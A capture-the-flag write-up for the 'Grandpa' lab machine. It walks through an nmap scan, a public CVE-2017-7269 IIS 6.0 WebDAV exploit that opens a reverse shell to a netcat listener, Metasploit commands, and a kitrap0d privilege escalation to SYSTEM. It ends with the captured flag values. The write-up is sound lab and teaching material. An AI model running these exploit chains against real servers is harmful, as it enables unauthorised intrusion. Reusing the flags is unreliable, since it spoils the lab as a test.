
## CTF Writeup: Grandpa

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.233
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 12:07 -0500
Nmap scan report for 10.129.95.233
Host is up (0.030s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Mon, 21 Sep 2026 17:08:59 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.82 seconds
```

As we can see from the TCP Scan the target seems to be running an very outdated IIS Webservice on port 80. Including an potential webdav endpoint.

I searched for IIS 6.0 exploits on google & found this CVE-2017-7269. I decided to search for exploits for this CVE & found the following:

```
git clone https://github.com/VanishedPeople/CVE-2017-7269.git
```

Gave the exploit executable permissions and started an local netcat listener on port 443.

```
chmod +x CVE-2017-7269.py
nc -lvnp 443
```

After that I decided to execute the exploit.

```
python3 CVE-2017-7269.py 10.129.95.233 80 10.10.14.57 443
```

Gained RCE as nt authority\network service.

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.95.233] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

## Privilege Escalation

Oddly enough there doesn't seem to be an C:\Users Directory on this server. Anyways I've decided to keep on moving forward and enumerated groups and privileges of our current user. This was very promising. Our current user has SeImpersonatePrivilege enabled, which should grant us SYSTEM Shell.

```
whoami /all
```

Let's exploit the SeImpersonatePrivilege Permission, by uploading an PrintSpoofer.exe onto the target server and run it.

Therefore I'll first startup an python3 webserver inside the directory in which the PrintSpoofer.exe is.

```
python3 -m http.server 80
```

Enumerated the CPU System Architecture and identified it's x86 (32-bit).

```
systeminfo
```

Which means we'll transfer PrintSpoofer's 32 bit version onto the target server.

After some time i gave up and tried to search for the same public exploit in metasploit!

```
msfconsole -q
search CVE-2017-7269
use windows/iis/iis_webdav_scstoragepathfromurl
set LHOST 10.10.14.57
set LPORT 443
set RHOSTS 10.129.95.233
set RPORT 80
exploit
```

Gained meterpreter session.

Since we couldn't migrate into an SYSTEM Process I will proceed with trying to analyze exploits using another metasploit module called "local_exploit_suggester".

```
ps
migrate 1433
background
search local_exploit_suggester
set SESSION 2
exploit
```

The scan revealed many exploits, I then decided to utilize the following Exploit as Privilege Escalation.

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 2
exploit
```

This unfortunately didn't work and prompted us with "Access is denied". There is an interesting trick tho, we can migrate to another process owned by our current user and retry.

Therefore I'll navigate back to my meterpreter session. Migrate to another process and run the exploit again and it worked!

```
sessions 2
ps
migrate 3532
background
exploit
```

We gained SYSTEM Shell.

Retrieved user.txt in C:\Documents and Settings\Harry\Desktop.

```
bdff5ec67c3cff017f2bedc146a5d869
```

Retrieved root.txt in C:\Documents and Settings\Administrator\Desktop.

```
9359e905a2c35f861f6a57cecf28bb7b
```